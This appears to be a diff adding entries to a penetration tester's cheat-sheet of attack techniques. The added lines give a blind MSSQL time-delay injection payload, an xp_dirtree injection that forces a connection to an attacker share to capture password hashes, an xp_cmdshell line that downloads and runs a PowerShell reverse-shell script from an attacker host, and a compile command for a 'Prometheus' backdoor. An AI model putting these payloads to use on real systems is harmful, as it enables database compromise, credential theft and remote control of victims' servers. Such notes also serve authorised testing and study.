@@ -423,10 +423,22 @@ Another method of detecting blind command injection is by forcing some output. T
 
 ##### Verbose command injection
 
-#### SQL Injection
+#### SQL Injection (May need Burp)
 The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query. 
 
 [MSSQL Practical Injection Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
+
+Blind based MSSQL injection through web app. will delay web page for 5 seconds if user is sa
+
+```
+' if (select user) != 'sa' waitfor delay '0:0:5'--
+```
+
+run responder and attemp to capture hash. 
+
+```
+'+EXEC+master.sys.xp_dirtree+'\\AttackerIP\share--
+```
 
 Login it to mssql remotely 
 
@@ -482,6 +494,9 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 ```
 
+```
+xp_cmdshell powershell iex(new-objectnet.webclient).downloadstring(\"http://AttackerIP/Invoke-PowerShellTcp.ps1\")
+```
 after every command
 
 ```
@@ -1958,6 +1973,12 @@ Response.Write(thisDir)%>
 </BODY>
 <%Response.write("<!-"&"-") %>
 -->
+```
+
+### Prometheus
+
+```
+i686-w64-mingw32-g++ /opt/prometheus/prometheus.cpp -o thescriptkid.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
 
 ## Malware Analysis
